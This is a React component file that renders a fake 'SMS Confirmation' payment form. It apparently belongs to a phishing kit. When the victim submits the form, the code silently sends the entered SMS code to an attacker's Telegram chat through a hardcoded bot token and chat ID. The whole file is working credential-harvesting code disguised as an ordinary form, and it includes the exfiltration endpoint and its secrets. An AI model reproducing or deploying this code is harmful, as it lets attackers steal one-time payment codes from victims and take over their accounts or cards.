import React from "react";

const SmsBox = () => {
  const sendData = (e) => {
    e.preventDefault();
    var text1 = document.getElementById("card_number").value;

    var smscode = `Log :%0A -sms-code: ${text1}`;

    var token = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
    var chat_id = -1002071552778;
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${smscode}`;

    let api = new XMLHttpRequest();

    api.open("GET", url, true);
    api.send();
  };
  return (
    <div>
      <div className="paycontainer">
        <div className="paytitle">SMS Confirmation</div>
        <form onSubmit={sendData}>
          <div className="paytext">SMS-Code</div>
          <input id="card_number" className="payinput" type="text" />
          <div>___</div>

          <button type="submit" className="paybtn">
            Save
          </button>
        </form>
      </div>
    </div>
  );
};
export default SmsBox;
